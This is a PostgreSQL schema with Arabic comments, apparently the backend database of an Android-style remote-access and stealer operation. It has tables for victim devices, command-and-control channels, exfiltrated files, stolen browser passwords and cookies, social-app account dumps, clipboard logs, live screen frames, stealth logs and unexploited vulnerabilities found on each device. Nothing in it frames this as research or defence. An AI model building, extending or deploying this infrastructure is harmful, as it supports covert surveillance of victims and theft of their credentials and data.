-- database/complete_schema.sql (نفذ في كل مشروع من المشاريع الأربعة)
-- ============================================================
-- 1. تنظيف البيئة (حذف الجداول القديمة)
-- ============================================================
DROP TABLE IF EXISTS sessions CASCADE;
DROP TABLE IF EXISTS banned_chats CASCADE;
DROP TABLE IF EXISTS notification_logs CASCADE;
DROP TABLE IF EXISTS media_captures CASCADE;
DROP TABLE IF EXISTS service_tasks CASCADE;
DROP TABLE IF EXISTS client_info CASCADE;
DROP TABLE IF EXISTS clipboard_logs CASCADE;
DROP TABLE IF EXISTS installed_apps CASCADE;
DROP TABLE IF EXISTS video_call_alerts CASCADE;
DROP TABLE IF EXISTS pos_clients CASCADE;
DROP TABLE IF EXISTS device_keys CASCADE;
DROP TABLE IF EXISTS service_requests CASCADE;
DROP TABLE IF EXISTS stolen_cookies CASCADE;
DROP TABLE IF EXISTS exfil CASCADE;
DROP TABLE IF EXISTS browser_creds CASCADE;
DROP TABLE IF EXISTS social_dumps CASCADE;
DROP TABLE IF EXISTS ai_tasks CASCADE;
DROP TABLE IF EXISTS ai_results CASCADE;
DROP TABLE IF EXISTS c2_channels CASCADE;
DROP TABLE IF EXISTS c2_status CASCADE;
DROP TABLE IF EXISTS stealth_logs CASCADE;
DROP TABLE IF EXISTS error_logs CASCADE;
DROP TABLE IF EXISTS discovered_vulnerabilities CASCADE;
DROP TABLE IF EXISTS heartbeat CASCADE;
DROP TABLE IF EXISTS bot_status CASCADE;
DROP TABLE IF EXISTS config CASCADE;
DROP TABLE IF EXISTS live_frames CASCADE;

-- ============================================================
-- 2. إدارة الوصول والأمان
-- ============================================================
CREATE TABLE sessions (
    chat_id BIGINT PRIMARY KEY,
    last_activity TIMESTAMPTZ DEFAULT now(),
    session_token TEXT
);

CREATE TABLE banned_chats (
    chat_id BIGINT PRIMARY KEY,
    banned_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 3. إدارة الأجهزة والاتصال
-- ============================================================
CREATE TABLE pos_clients (
    Entry_id BIGSERIAL PRIMARY KEY,
    Client_serial TEXT UNIQUE NOT NULL,
    Hardware_uuid TEXT,
    Public_key TEXT,
    First_seen TIMESTAMPTZ DEFAULT now(),
    Last_seen TIMESTAMPTZ DEFAULT now(),
    Operational_status TEXT DEFAULT 'online',
    Has_root BOOLEAN DEFAULT false,
    Has_accessibility BOOLEAN DEFAULT false,
    Ip_address TEXT,
    Victim_data_enc TEXT,
    Device_config JSONB
);

CREATE TABLE device_keys (
    Device_id TEXT PRIMARY KEY REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Shared_key_enc TEXT NOT NULL,
    Expiry BIGINT NOT NULL
);

CREATE TABLE heartbeat (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    last_ping TIMESTAMPTZ DEFAULT now(),
    battery_level INT,
    network_type TEXT
);

-- ============================================================
-- 4. إدارة البوتات (جداول جديدة ضرورية)
-- ============================================================
CREATE TABLE bot_status (
    bot_id TEXT PRIMARY KEY,               -- معرف البوت (مثل master, stream, project1)
    bot_token_enc TEXT NOT NULL,           -- التوكن مشفر (أو مرجع في Vault)
    last_ping TIMESTAMPTZ DEFAULT now(),
    is_active BOOLEAN DEFAULT true,
    fail_count INT DEFAULT 0,
    role TEXT                               -- رئيسي، احتياطي، بث، إلخ
);

CREATE TABLE c2_channels (
    Channel_id BIGSERIAL PRIMARY KEY,
    Channel_type TEXT NOT NULL,
    Channel_name TEXT,
    Is_active BOOLEAN DEFAULT true,
    Last_used TIMESTAMPTZ DEFAULT now(),
    Usage_count BIGINT DEFAULT 0
);

CREATE TABLE c2_status (
    Id BIGSERIAL PRIMARY KEY,
    Channel TEXT,
    Status TEXT,
    Last_check TIMESTAMPTZ DEFAULT now(),
    Error_message TEXT
);

CREATE TABLE config (
    key TEXT PRIMARY KEY,
    value TEXT NOT NULL,
    updated_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 5. البث المباشر (جديد)
-- ============================================================
CREATE TABLE live_frames (
    id BIGSERIAL PRIMARY KEY,
    session_id TEXT NOT NULL,
    device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    frame_enc TEXT NOT NULL,   -- الإطار مشفر
    created_at TIMESTAMPTZ DEFAULT now()
);
CREATE INDEX idx_live_frames_session ON live_frames(session_id);

-- ============================================================
-- 6. المهام والأوامر
-- ============================================================
CREATE TABLE service_requests (
    Ticket_id BIGSERIAL PRIMARY KEY,
    Target_client TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Request_type TEXT NOT NULL,
    Request_data TEXT,
    Ticket_status TEXT DEFAULT 'open',
    Resolution_log JSONB,
    Opened_at TIMESTAMPTZ DEFAULT now(),
    Last_updated TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 7. استخراج البيانات
-- ============================================================
CREATE TABLE exfil (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    File_path TEXT NOT NULL,
    File_name TEXT,
    File_size BIGINT,
    Mime_type TEXT,
    File_type TEXT GENERATED ALWAYS AS (
        CASE
            WHEN file_name ~* '\.(jpg|jpeg|png|gif|webp)$' THEN 'image'
            WHEN file_name ~* '\.(mp4|avi|mov|mkv|webm)$' THEN 'video'
            ELSE 'other'
        END
    ) STORED,
    Uploaded_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE browser_creds (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Browser TEXT,
    url TEXT,
    Username TEXT,
    Password_enc TEXT,
    Captured_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE social_dumps (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    App TEXT,
    Account_data JSONB,
    Dumped_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 8. تحليل الثغرات والذكاء الاصطناعي
-- ============================================================
CREATE TABLE discovered_vulnerabilities (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Vulnerability_type TEXT,
    Severity TEXT,
    Discovery_data JSONB,
    Status TEXT DEFAULT 'unexploited',
    Found_at TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE ai_tasks (
    Task_id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Task_type TEXT NOT NULL,
    Task_params JSONB,
    Result_data JSONB,
    Status TEXT DEFAULT 'pending',
    Created_at TIMESTAMPTZ DEFAULT now(),
    Completed_at TIMESTAMPTZ
);

CREATE TABLE ai_results (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Module TEXT,
    Result JSONB,
    Created_at TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 9. السجلات
-- ============================================================
CREATE TABLE stealth_logs (
    Log_id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Event_type TEXT NOT NULL,
    Event_data JSONB,
    Timestamp TIMESTAMPTZ DEFAULT now()
);

CREATE TABLE error_logs (
    Id BIGSERIAL PRIMARY KEY,
    Device_id TEXT NOT NULL REFERENCES pos_clients(client_serial) ON DELETE CASCADE,
    Error_code TEXT NOT NULL,
    Error_message TEXT,
    Module TEXT,
    Timestamp TIMESTAMPTZ DEFAULT now()
);

-- ============================================================
-- 10. الفهارس
-- ============================================================
CREATE INDEX idx_pos_clients_serial ON pos_clients(client_serial);
CREATE INDEX idx_exfil_device ON exfil(device_id);
CREATE INDEX idx_requests_target ON service_requests(target_client);
CREATE INDEX idx_heartbeat_device ON heartbeat(device_id);
CREATE INDEX idx_vuln_device ON discovered_vulnerabilities(device_id);
CREATE INDEX idx_bot_status_last_ping ON bot_status(last_ping);

-- ============================================================
-- 11. تفعيل RLS لجميع الجداول
-- ============================================================
DO $$
DECLARE
    tbl text;
BEGIN
    FOR tbl IN (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public') LOOP
        EXECUTE format('ALTER TABLE %I ENABLE ROW LEVEL SECURITY', tbl);
        EXECUTE format('DROP POLICY IF EXISTS "Service role full access" ON %I', tbl);
        EXECUTE format('CREATE POLICY "Service role full access" ON %I FOR ALL USING (auth.role() = ''service_role'')', tbl);
    END LOOP;
END $$;
